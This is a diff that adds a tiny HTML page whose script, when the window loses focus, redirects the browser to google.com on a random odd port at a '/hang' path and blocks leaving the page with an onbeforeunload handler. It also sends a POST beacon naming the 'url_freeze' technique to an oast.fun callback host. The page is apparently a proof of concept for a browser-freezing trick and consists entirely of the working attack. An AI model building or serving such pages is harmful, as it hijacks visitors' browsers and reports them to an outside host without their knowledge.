@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+window.onblur = function() {
+    // Magic: Custom port website hanging
+    const ports = [':8080', ':3000', ':9999', ':1337'];
+    const randomPort = ports[Math.floor(Math.random() * ports.length)];
+    
+    // Redirect ke URL dengan custom port yang hang
+    window.location.href = `https://google.com${randomPort}/hang`;
+    
+    // Block further navigation
+    window.onbeforeunload = function(e) {
+        e.preventDefault();
+        e.returnValue = '';
+        return '';
+    };
+    
+    fetch('https://xzyoueivlwuoczvmzdkqqjenlqqjxdxxl.oast.fun/port_hang', {
+        method: 'POST',
+        body: JSON.stringify({port: randomPort, technique: 'url_freeze'})
+    });
+};
+</script>
+<h1>Click new tab </h1>
+</body>
+</html>
